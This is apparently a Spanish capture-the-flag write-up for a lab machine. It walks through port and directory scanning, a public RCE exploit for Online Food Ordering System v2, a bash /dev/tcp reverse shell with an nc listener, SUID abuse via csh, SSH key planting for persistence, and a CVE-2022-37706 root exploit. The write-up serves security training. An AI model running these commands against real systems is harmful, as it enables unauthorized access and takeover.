## Fase de reconocimiento

### Nmap

Realizo un escaneo con nmap para ver que servicios hay en la maquina victima.

`nmap -sV -p- 192.168.1.5`

![](Imagenes/Pasted%20image%2020250913190803.png)

Veo que hay un servicio ssh en el puerto 22 y un http en el 80, así que voy a utilizar gobuster para enumerar todas las rutas del servicio http

`gobuster dir -u http://192.168.1.5 -w ~/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,jpg`
`
![](Imagenes/Pasted%20image%2020250913201732.png)

Lo más interesante que hay es un /admin, /database aunque solo puedo acceder en el /admin así que voy a probar a acceder por ahí

![](Imagenes/Pasted%20image%2020250913201923.png)

En la página de admin veo que hay un titulo del sistema y un panel de login, investigo un poco en la página pero no encuentro nada que pueda hacer y decido buscar más información sobre el sistema Online Food Ordering System v2

![](Imagenes/Pasted%20image%2020250913202206.png)


Veo que existe una vulnerabilidad RCE

## Explotación de la vulnerabilidad

![](Imagenes/Pasted%20image%2020250913205556.png)
Utilizando searchsploit lo puedo encontrar

![](Imagenes/Pasted%20image%2020250913210009.png)
![](Imagenes/Pasted%20image%2020250913210028.png)

Voy a darle permisos y a usarlo

![](Imagenes/Pasted%20image%2020250914111808.png)

![](Imagenes/Pasted%20image%2020250914111735.png)

Ya tengo una shell remota con acceso a la maquina

## Escalada de privilegios

### Mejorar la shell
Como la terminal que tengo ahora es muy limitada mejor creo una reverse shell

En la maquina atacante ejecuto

`nc -lnvp 1234`

![](Imagenes/Pasted%20image%2020250914114014.png)

En la maquina víctima ejecuto: `/bin/bash -c "bash -i >& /dev/tcp/192.168.1.6/1234 0>&1"`

![](Imagenes/Pasted%20image%2020250914113937.png)

I me llega la conexión a mi maquina

![](Imagenes/Pasted%20image%2020250914114036.png)

ahora puedo mejorar mi shell y seguir escalando

`script /dev/null -c bash`
`Cntrl + z`
`stty raw -echo; fg`
`reset xterm`
`export TERM=xterm`

### Escalada
Ejecuto `sudo -l` para ver que puedo hacer con este usuario

![](Imagenes/Pasted%20image%2020250914114515.png)
Me pide la contraseña así que no puedo usarlo

Ejecuto `find / -perm -u=s -type f 2>/dev/null` para ver los binarios

![](Imagenes/Pasted%20image%2020250914114900.png)
Y revisando con la página gtfobins encuentro que el binario /usr/bin/bsd-csh me puede servir para la escalada 

![](Imagenes/Pasted%20image%2020250914115742.png)
si ejecuto csh -b me permite crear una shell con el usuario aelis

![](Imagenes/Pasted%20image%2020250914120952.png)

Ahora puedo intentar copiar mi clave ssh para poder tener una shell mejor con este usuario

Creo una nueva clave:

`ssh-keygen -t ed25519`

Y la guardo en .ssh/authorized_keys en la maquina víctima:

`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnpGk9T8aEZWXQq57Z+GGAC5H9DXp5i/EgpkV/l0U0R kali@kali" > authorized_keys`

Ahora solo queda connectarse con ssh:

`ssh aelis@192.168.1.5 -i id_rsa`

![](Imagenes/Pasted%20image%2020250914124437.png)

Voy a intentar buscar más información sobre los binarios que tengo disponibles para ver si puedo utilizar alguno

Parece que con el binario enlightenment_ckpasswd existe un exploit para hacer escalada a root

![](Imagenes/Pasted%20image%2020250914125038.png)

Clono el repositorio en mi maquina y lo paso por scp

`git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit.git`

`scp -r CVE-2022-37706-LPE-exploit aelis@192.168.1.5:/home/aelis`

![](Imagenes/Pasted%20image%2020250914131738.png)

Le doy permisos al script y lo ejecuto

![](Imagenes/Pasted%20image%2020250914131816.png)

Ahora que ya tengo root solo queda obtener las flags